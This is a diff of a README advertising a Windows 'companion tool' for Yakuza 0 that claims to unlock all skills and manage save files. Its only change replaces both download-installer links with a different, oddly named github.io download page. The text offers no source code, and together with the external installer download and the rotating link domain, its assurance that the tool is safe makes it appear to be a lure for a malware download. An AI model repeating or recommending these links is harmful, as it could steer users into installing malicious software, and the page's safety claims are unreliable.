@@ -2,7 +2,7 @@
 
 Welcome to the ultimate companion tool for Yakuza 0 on PC. This desktop application allows you to unlock all skills instantly, manage save files, and customize various aspects of the game for an enhanced experience. Designed specifically for Windows 10 and 11, it provides a safe and user-friendly way to explore everything Yakuza 0 has to offer.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -69,7 +69,7 @@ A: Yes, the tool is fully compatible with keyboard, mouse, and Xbox or PlayStati
 
 For the latest version and updates, please visit the official download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## Disclaimer
 
